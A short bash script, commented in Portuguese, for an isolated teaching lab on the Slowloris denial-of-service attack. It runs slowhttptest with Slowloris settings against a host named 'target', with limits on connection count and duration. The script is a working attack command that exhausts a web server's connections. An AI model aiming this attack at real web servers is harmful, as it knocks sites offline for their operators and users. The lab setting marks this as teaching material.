#!/bin/bash
# Lab didático de Slowloris — rede isolada (sem rota para a internet).
# Alvo fixo em "target". Número de conexões e duração limitados de propósito.
#
# Uso: attack-slowloris.sh [duracao_segundos] [conexoes]

DURATION="${1:-30}"
CONNS="${2:-180}"

echo "[attack-slowloris] alvo=target duracao=${DURATION}s conexoes=${CONNS}"
echo "[attack-slowloris] repare: a banda quase não sobe, mas o site trava."

slowhttptest -c "${CONNS}" -H -g -o /tmp/slowloris-result \
  -i 10 -r 50 -t GET -u http://target/ -x 24 -p 3 \
  -l "${DURATION}"

echo "[attack-slowloris] fim. Resultado em /tmp/slowloris-result.csv"
